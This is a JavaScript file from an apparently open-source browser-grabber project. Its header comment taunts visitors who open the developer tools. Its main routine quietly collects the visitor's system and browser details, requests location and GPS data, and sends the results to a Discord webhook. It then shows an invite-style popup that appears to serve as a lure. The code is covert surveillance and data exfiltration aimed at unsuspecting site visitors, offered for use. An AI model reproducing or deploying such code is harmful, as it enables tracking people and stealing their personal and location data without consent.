// Congrats on using F12. It's too late but don't worry - we're the good guys.
//
// Follow the Discord link to join us.
// This project is open source and can be found at https://github.com/RocketGod-git/thepiratesplunder 
//
// __________                  __             __     ________             .___ 
// \______   \  ____    ____  |  | __  ____ _/  |_  /  _____/   ____    __| _/ 
//  |       _/ /  _ \ _/ ___\ |  |/ /_/ __ \\   __\/   \  ___  /  _ \  / __ |  
//  |    |   \(  <_> )\  \___ |    < \  ___/ |  |  \    \_\  \(  <_> )/ /_/ |  
//  |____|_  / \____/  \___  >|__|_ \ \___  >|__|   \______  / \____/ \____ |  
//         \/              \/      \/     \/               \/              \/  


let webhook_url; 

async function main() {
    try {
        // Use the global webhook passed in from HTML
        webhook_url = window.webhook_url;

        var systemDetails = getSystemDetails();

        // Always start with gathering minimal information
        const minimalInfo = await gatherMinimalInformation();
        
        // Send minimal information if the OS or browser is unknown or protected
        if (systemDetails.operatingSystem === "Unknown or Protected OS" || systemDetails.browser === "Unknown or Protected Browser") {
            sendDiscordMessage(webhook_url, [{
                "title": "Minimal Browser Access Detected",
                "description": `Access with minimal browser information detected. Details: ${JSON.stringify(minimalInfo)}`,
                "color": 16776960
            }]);
        }

        // Proceed with the full check regardless of the minimal information gathered
        await getLocationAndGPSData();
        setTimeout(showPopup, 3000);
        window.acceptInvite = acceptInvite;

    } catch (error) {
        console.error('Error occurred:', error);
    }
}
